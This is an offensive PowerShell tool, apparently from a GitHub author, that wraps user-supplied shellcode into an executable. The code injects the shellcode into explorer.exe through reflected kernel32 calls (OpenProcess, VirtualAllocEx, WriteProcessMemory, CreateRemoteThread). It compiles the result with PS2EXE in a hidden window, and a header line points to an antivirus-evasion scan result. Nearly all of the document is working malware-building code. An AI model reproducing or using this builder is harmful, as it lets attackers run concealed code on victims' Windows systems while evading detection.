# Coded by Abdullah AlZahrani GitHub.com/0xAbdullh
# UndMShell v0.1 - 7/10/2021 
# https://antiscan.me/scan/new/result?id=uKE1Uhhi9drE
Write-Host '[-] UndMShell v0.1 | Coded by Abdullah AlZahrani | GitHub.com/0xAbdullah'

# Check if PS2EXE module is installed.
if (!(Get-Module -ListAvailable -Name 'ps2exe')) {
    Write-Host "[!] PS2EXE module does not exist."
    Write-Host "[!] 1) Run powersehll as Administrator."
    Write-Host '[!] 2) Install-Module ps2exe'
    Break
}

if (!$args[0] -Or !$args[1]) { 
        Write-Host '[!] Enter the path to shellcode file & name for output file.'
        Write-Host '[!] .\UndMShell.ps1 shellcode.txt output.exe'
        Break
        }
else {
    $readFile = $args[0]
    $fileName = $args[1]
    Write-Host '- Your shellcode file:' $readFile
    # This template from Offensive Security's PEN-300 course.
    $template = @'
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

$procId = (Get-Process explorer).Id

SHELLCODE

$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess),
  (getDelegateType @([UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, 0, $procId)

$expAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), 
  (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, [UInt32]$buf.Length, 0x3000, 0x40)


$procMemResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), 
  (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])([Bool]))).Invoke($hProcess, $expAddr, $buf, [Uint32]$buf.Length, [IntPtr]::Zero)         

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread),
  (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0, $expAddr, 0, [IntPtr]::Zero)
Exit
'@

    $shellCode = Get-Content $readFile

    Write-Host '- Something is cooking, wait.'

    $template = $template.replace('SHELLCODE',$shellCode)

    Add-Content -Path UndMShell_temp.ps1 -Value $template

    $complieCommand = 'Invoke-PS2EXE .\UndMShell_temp.ps1 .\' + $fileName

    Start-Process 'powershell' $complieCommand -WindowStyle Hidden

    Start-Sleep -s 5

    Remove-Item 'UndMShell_temp.ps1'

    Write-Host '- Your payload is ready:' $fileName
}
